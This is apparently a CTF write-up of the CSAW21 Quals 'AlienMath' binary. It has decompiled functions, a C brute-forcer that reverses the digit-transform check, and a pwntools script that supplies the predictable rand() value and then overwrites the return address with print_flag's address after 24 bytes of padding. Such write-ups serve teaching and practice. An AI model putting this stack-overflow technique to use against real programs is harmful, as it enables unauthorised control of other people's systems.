# AlienMath (CSAW21  - Quals) 

## 1. Analisis

### Main
```
undefined8 main(void)

{
  int iVar1;
  char local_38 [36];
  int local_14;
  long local_10;
  
  puts("\n==== Flirbgarple Math Pop Quiz ====");
  puts("=== Make an A to receive a flag! ===\n");
  puts("What is the square root of zopnol?");
  fflush(stdout);
  __isoc99_scanf(&DAT_0040220b,&local_14);
  iVar1 = rand();
  local_10 = (long)iVar1;
  if (local_10 == local_14) {
    puts("Correct!\n");
    fflush(stdout);
    getchar();
    puts("How many tewgrunbs are in a qorbnorbf?");
    fflush(stdout);
    __isoc99_scanf(&DAT_00402247,local_38);
    second_question(local_38);
  }
  else {
    puts("Incorrect. That\'s an F for you!");
  }
  return 0;
}
```
### void second_question(char *param_1)
```
void second_question(char *param_1)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  size_t sVar4;
  ulong uVar5;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  int local_1c;
  
  local_1c = 0;
  while( true ) {
    uVar5 = SEXT48(local_1c);
    sVar4 = strlen(param_1);
    if (sVar4 - 1 <= uVar5) {
      local_38 = 0x3436303439353737;
      local_30 = 0x3332333535323538;
      local_28 = 0x353232393232;
      sVar4 = strlen((char *)&local_38);
      iVar3 = strncmp((char *)&local_38,param_1,sVar4);
      if (iVar3 == 0) {
        puts("Genius! One question left...\n");
        final_question();
        puts("Not quite. Double check your calculations.\nYou made a B. So close!\n");
      }
      else {
        puts("You get a C. No flag this time.\n");
      }
      return;
    }
    if ((param_1[local_1c] < '0') || ('9' < param_1[local_1c])) break;
    cVar1 = param_1[(long)local_1c + 1];
    uVar2 = second_question_function((int)param_1[local_1c],param_1[local_1c] + local_1c);
    iVar3 = cVar1 + -0x30 + uVar2;
    param_1[(long)local_1c + 1] = (char)iVar3 + (char)(iVar3 / 10) * -10 + '0';
    local_1c = local_1c + 1;
  }
  puts("Xolplsmorp! Invalid input!\n");
  puts("You get a C. No flag this time.\n");
  return;
}
```

### void second_question_function(int param_1,int param_2)
```
uint second_question_function(int param_1,int param_2)

{
  return (uint)((param_1 + -0x30) * 0x30 + (param_2 + -0x30) * 0xb + -4) % 10;
}
```

### void print_flag(void)
```
void print_flag(void)

{
  char local_98 [136];
  FILE *local_10;
  
  puts("Here is your flag: ");
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts(
        "Xolplsmorp! If you see this when trying your exploit remotely, contact an administrator!\n"
        );
  }
  else {
    fgets(local_98,0x88,local_10);
    printf("%s",local_98);
  }
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  exit(0);
}

```

## 2. Exploit

### algoritmo.c
```
#include <stdio.h>
#include <string.h>


int second_question_function(int param_1,int param_2){
    return (int)((param_1 + -0x30) * 0x30 + (param_2 + -0x30) * 0xb + -4) % 10;
}

char * second_question(char uncrypted[], int leng_arg){
    char secret[22];
    memset(secret,'\x00',leng_arg);
    char *secret_ptr=secret;
    strncpy(secret,uncrypted,leng_arg);
    int leng=strlen(secret);
    int contador=0;
    while(1){
        if(contador<leng-1){
            if(secret[contador]<0x29 || secret[contador]>0x39)break;
            int siguiente_elemento=secret[contador+1];

            int resultado= second_question_function((secret[contador]),(secret[contador])+contador) ;

            resultado=siguiente_elemento -0x30 +resultado;

            secret[contador + 1] = (char)resultado + (char)(resultado / 10) * -10 + '0';
            contador++;
        }
        else{
            break;
        }

    }
    return secret_ptr;
}

char *bruteforce()
{
    char goal[22]="7759406485255323229225";
    char start[22];
    memset(start,'\x00',22);
    int limit=1;
    int i=0;
    int founded=0;
    while(1){
            start[limit-1]=(int)i+'0';
            char *crypted=second_question(start,limit);
            if(crypted[limit-1]==goal[limit-1]){
                if(limit==22)founded=1;
                limit++;
                i=0;
            }
            printf("%s -> %s\n",start,crypted);
            if(founded)break;
            if(i==9 && limit<22)
                i=0;
            else
                i++;
 
    }
}

int main()
{
    // sended 4802889
    // transformed 4073446
    // char *secret="4802889";    
    // char *target="4073446";
    // char *r_2=second_question(target);
    bruteforce();
    return 0;
}
```

### exploit.py
```
#!/usr/bin/python3
from pwn import *
elf = context.binary = ELF("alien_math")
libc = elf.libc
context.log_level = "DEBUG"
# 0000000000401382 cmp     al, 47
# 000000000040139A cmp     al, 57
# 00000000004014BB call    strcmp_plt
gs = '''
break *0x401382
break *0x40139A
break *0x4014bb
'''
printFlag = p64(elf.symbols.print_flag)
OFFSET = 24
padd = b"A" * OFFSET
# RDI  0x7fffffffde20 ◂— '7759406485255323229225'

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        # p = remote('pwn.chal.csaw.io', 5004)
        return process(elf.path)

print(elf.plt)
io = start()
io.sendline('1804289383')
io.sendline('7856445899213065428791')
payload = [
            padd,
            printFlag,
        ]
payload = b''.join(payload)
io.sendline(payload)
io.interactive()
```